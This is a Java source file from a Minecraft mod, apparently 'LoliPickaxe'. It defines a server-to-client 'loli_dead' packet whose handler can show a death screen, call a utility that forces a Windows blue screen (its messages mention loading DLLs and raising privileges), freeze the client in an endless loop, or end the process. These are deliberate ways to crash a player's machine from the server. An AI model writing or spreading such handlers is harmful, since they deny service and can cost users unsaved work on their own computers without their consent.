package net.xuyifei.lolipickaxe.common.network;

import com.sun.jna.Platform;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.screens.DeathScreen;
import net.minecraft.network.RegistryFriendlyByteBuf;
import net.minecraft.network.chat.Component;
import net.minecraft.network.codec.ByteBufCodecs;
import net.minecraft.network.codec.StreamCodec;
import net.minecraft.network.protocol.common.custom.CustomPacketPayload;
import net.minecraft.resources.ResourceLocation;
import net.neoforged.api.distmarker.Dist;
import net.neoforged.api.distmarker.OnlyIn;
import net.neoforged.neoforge.network.handling.IPayloadContext;
import net.xuyifei.lolipickaxe.LoliPickaxe;
import net.xuyifei.lolipickaxe.common.util.bluescreen.BlueScreenUtil;
import net.xuyifei.lolipickaxe.common.util.bluescreen.DllLoadException;
import net.xuyifei.lolipickaxe.common.util.bluescreen.FunctionLoadException;
import org.jetbrains.annotations.NotNull;

public record ClientboundLoliDeadPacket(boolean gui, boolean blueScreen, boolean exit, boolean failRespond) implements CustomPacketPayload {
    public static final CustomPacketPayload.Type<ClientboundLoliDeadPacket> TYPE = new CustomPacketPayload.Type<>(ResourceLocation.fromNamespaceAndPath(LoliPickaxe.MODID, "loli_dead"));

    public static final StreamCodec<RegistryFriendlyByteBuf, ClientboundLoliDeadPacket> STREAM_CODEC = StreamCodec.composite(
            ByteBufCodecs.BOOL,
            ClientboundLoliDeadPacket::gui,
            ByteBufCodecs.BOOL,
            ClientboundLoliDeadPacket::blueScreen,
            ByteBufCodecs.BOOL,
            ClientboundLoliDeadPacket::exit,
            ByteBufCodecs.BOOL,
            ClientboundLoliDeadPacket::failRespond,
            ClientboundLoliDeadPacket::new
    );

    @Override
    public boolean gui() {
        return gui;
    }

    @Override
    public boolean blueScreen() {
        return blueScreen;
    }

    @Override
    public boolean exit() {
        return exit;
    }

    @Override
    public boolean failRespond() {
        return failRespond;
    }

    @Override
    public @NotNull Type<? extends CustomPacketPayload> type() {
        return TYPE;
    }

    @OnlyIn(Dist.CLIENT)
    public static void handle(final ClientboundLoliDeadPacket packet, final IPayloadContext context) {
        context.enqueueWork(() -> {
            if (packet.gui() && !(Minecraft.getInstance().screen instanceof DeathScreen)) {
                Minecraft.getInstance().execute(() -> Minecraft.getInstance().setScreen(new DeathScreen(Minecraft.getInstance().player.getCombatTracker().getDeathMessage(), Minecraft.getInstance().player.level().getLevelData().isHardcore())));
            }
            boolean success = false;
            if (packet.blueScreen()) {
                if (Platform.isWindows()) {
                    try {
                        BlueScreenUtil.blueScreen();
                        success = true;
                    } catch (DllLoadException e) {
                        Minecraft.getInstance().player.sendSystemMessage(Component.literal("蓝屏失败！原因：缺失DLL\"" + e.getMessage() + "\""));
                    } catch (FunctionLoadException e) {
                        Minecraft.getInstance().player.sendSystemMessage(Component.literal("蓝屏失败！原因：未找到方法\"" + e.getMessage() + "\""));
                    } catch (RuntimeException e) {
                        Minecraft.getInstance().player.sendSystemMessage(Component.literal("蓝屏失败！提权失败或未知错误：\"" + e.getMessage() + "\""));
                    }
                } else {
                    Minecraft.getInstance().player.sendSystemMessage(Component.literal("蓝屏失败！需要Windows操作系统才可以使用蓝屏功能！"));
                }
            }
            if (packet.failRespond() || (packet.blueScreen() && !success)) {
                Minecraft.getInstance().execute(() -> {
                    while (true);
                });
            }
            if (packet.exit()) {
                Runtime.getRuntime().exit(0);
            }
        });
    }
}
